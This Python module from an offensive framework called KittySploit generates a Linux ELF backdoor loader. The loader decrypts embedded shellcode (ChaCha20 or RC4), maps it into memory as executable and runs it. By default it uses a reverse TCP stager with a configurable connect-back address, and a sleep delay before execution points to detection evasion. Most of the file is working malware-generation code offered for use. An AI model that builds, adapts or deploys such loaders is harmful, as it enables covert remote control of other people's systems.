#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Static Linux ELF shellcode loader.

Decrypts embedded shellcode (ChaCha20/RC4), maps with mmap, flips to RX via
mprotect, and executes. Linux equivalent of encrypted_dropper_evasion.
"""

from kittysploit import *
from lib.compile.backdoor_helpers import option_value
from lib.compile.elf_shellcode_loader import ElfShellcodeLoaderBuilder
from lib.compile.linux_backdoor_helpers import build_encrypted_elf_backdoor


class Module(Backdoor):
    __info__ = {
        "name": "Linux ELF Shellcode Loader",
        "description": (
            "Generate a static Linux x64 ELF that decrypts embedded shellcode in memory "
            "and executes it via mmap + mprotect (RX). Compiled with Zig to x86_64-linux-gnu."
        ),
        "author": "KittySploit",
        "platform": Platform.LINUX,
        "arch": Arch.X64,
    }

    payload_path = OptString(
        "payloads/stagers/linux/x64/reverse_tcp",
        "Payload module path (raw shellcode)",
        True,
    )
    lhost = OptString("127.0.0.1", "Connect-back IP address (reverse payloads)", True)
    lport = OptPort(4444, "Connect-back TCP port (reverse payloads)", True)
    encoder = OptString("", "Encoder module path (optional)", False)
    cipher = OptChoice("chacha", "Shellcode encryption type", True, ["chacha", "rc4"])
    sleep = OptInteger(5000, "Sleep milliseconds before executing shellcode", False)
    output_name = OptString("elf_shellcode_loader", "Output ELF filename", False)
    optimization = OptChoice(
        "ReleaseSmall",
        "Zig optimization level",
        False,
        ["Debug", "ReleaseFast", "ReleaseSafe", "ReleaseSmall"],
    )
    save_source = OptBool(False, "Save generated C source alongside the ELF", False, advanced=True)

    def __init__(self, framework=None):
        super().__init__()
        self.framework = framework

    def run(self):
        builder = ElfShellcodeLoaderBuilder(
            cipher=str(option_value(self, "cipher") or "chacha").lower(),
            sleep_ms=int(option_value(self, "sleep") or 0),
        )
        ok = build_encrypted_elf_backdoor(
            self,
            builder,
            output_name="elf_shellcode_loader",
            save_source_name="elf_shellcode_loader.c",
        )
        if ok:
            print_info(f"Cipher: {option_value(self, 'cipher')} | Sleep: {option_value(self, 'sleep')} ms")
        return ok
